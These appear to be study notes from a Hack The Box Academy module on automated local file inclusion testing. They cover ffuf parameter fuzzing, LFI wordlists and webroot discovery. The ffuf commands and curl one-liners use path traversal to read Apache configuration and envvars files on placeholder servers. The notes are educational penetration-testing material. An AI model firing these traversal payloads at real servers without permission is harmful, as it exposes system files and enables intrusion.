[**Key Takeaways:**](https://academy.hackthebox.com/module/23/section/1494)

- **Importance of Manual Testing:**
    - Emphasizes that automated scanning is not a replacement for manual testing.
    - Custom payloads and techniques are often required for complex vulnerabilities.
    - Bypassing WAFs and firewalls requires in-depth understanding.
- **Fuzzing Parameters:**
    - Using `ffuf` to discover hidden GET/POST parameters.
    - Highlighting that hidden parameters may be less secure.
    - Providing a link to common LFI parameters.
- **LFI Wordlists:**
    - Using wordlists like `LFI-Jhaddix.txt` to automate LFI payload testing.
    - Demonstrating how to use `ffuf` with LFI wordlists.
    - Good explanation of how to verify the wordlists results.
- **Fuzzing Server Files:**
    - Fuzzing for server webroot paths, configuration files, and log files.
    - Providing links to Linux and Windows webroot wordlists.
    - Demonstrating how to find server configurations and log paths.
    - Good explanation of how to follow file paths, and find needed information.
- **LFI Tools:**
    - Mentioning popular LFI tools like LFISuite, LFiFreak, and liffy.
    - Acknowledging that many tools are outdated and rely on Python 2.
    - Good advice to test the tools, to see their accuracy.

**Additional Considerations:**

- **Tool Limitations:**
    - Automated tools may miss complex vulnerabilities or bypasses.
    - False positives and false negatives are common.
    - Tools need to be updated to be effective.
- **Wordlist Selection:**
    - Choosing appropriate wordlists is crucial for effective scanning.
    - Custom wordlists may be needed for specific applications.
- **WAF Evasion:**
    - Automated tools may not be effective against advanced WAFs.
    - Manual testing and payload crafting are often required.
- **Ethical Considerations:**
    - Automated scanning should only be performed on systems with explicit permission.
    - Avoid causing denial-of-service (DoS) attacks.
- **Scripting:**
    - Writing custom scripts can be a very effective way to automate the scanning process.
    - Python is a very useful language for this task.
- **Regular Expressions:**
    - When dealing with large amounts of data from log files, or configuration files, regular expressions are very useful.



```bash
# Discovering hidden parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
    -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287  

# Finding LFI vulnerabilities using wordlists
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
    -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287  

# Searching for default web root directories on Linux
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
    -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287  

# Using a custom LFI wordlist
ffuf -w ./LFI-WordList-Linux:FUZZ \
    -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287  
```

#### **curl (HTTP Request Tool)**

A command-line tool for transferring data with URLs, commonly used for making HTTP requests.

##### **Examples:**

```bash
# Accessing a sensitive configuration file
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf  

# Extracting environment variables from the server
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars  
```

### **Key Points:**

- The primary tools used are **ffuf** for fuzzing and **curl** for making HTTP requests.
- This guide focuses on **Linux-based** web servers and file inclusion vulnerabilities.
